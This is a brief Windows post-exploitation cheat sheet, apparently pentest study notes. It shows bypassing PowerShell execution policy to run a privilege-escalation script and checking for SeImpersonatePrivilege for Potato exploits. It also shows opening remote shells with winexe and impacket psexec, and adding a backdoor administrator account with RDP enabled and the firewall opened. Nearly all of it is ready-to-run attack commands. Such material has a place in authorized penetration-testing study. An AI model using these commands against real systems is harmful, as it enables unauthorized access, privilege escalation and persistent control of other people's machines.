# Execute Powershell Scripts From cmd.exe

```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Sherlock.ps1}"
```

# Privileges

Check privileges and look for `SeImpersonatePrivilege` --> Potato exploits

```
whoami /priv
```
For x86: compile exploits first

# Connect to Windows Host as Specific User

```
winexe -U username%password //10.11.1.73 cmd.exe
```

Or with impacket `psexec.py`:

```
./psexec.py alice:<password>@<IP> cmd.exe
```

# Add Admin User and Enable RDP

In case of an error, there is a possibility of Password Complexity set on the Remote Machine, try a complex password.
```
C:\WINDOWS\system32>net user thunder password /add && net localgroup "Remote Desktop users" thunder /add && net localgroup Administrators thunder /add
C:\WINDOWS\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\WINDOWS\system32>netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```